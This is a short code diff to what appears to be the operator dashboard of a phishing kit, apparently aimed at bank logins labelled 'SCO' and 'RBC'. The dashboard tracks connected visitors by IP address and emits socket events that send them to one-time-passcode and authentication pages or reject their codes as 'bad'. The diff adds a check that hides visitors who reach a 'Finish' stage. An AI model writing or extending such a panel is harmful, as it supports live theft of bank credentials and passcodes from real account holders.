@@ -138,7 +138,7 @@ function updateConnectionsTable(users) {
             socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
           });          
 
-    } else if(details.page == 'SCO'){
+    } else if(details.page == 'SCO' && details.stage != 'Finish'){
       userDiv.innerHTML = `
         
       <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
@@ -174,7 +174,7 @@ function updateConnectionsTable(users) {
       sendAuthButton.addEventListener('click', function() {
         socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
       });    
-    } else if(details.page == 'RBC'){
+    } else if(details.page == 'RBC' && details.stage != 'Finish'){
       userDiv.innerHTML = `
         
       <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
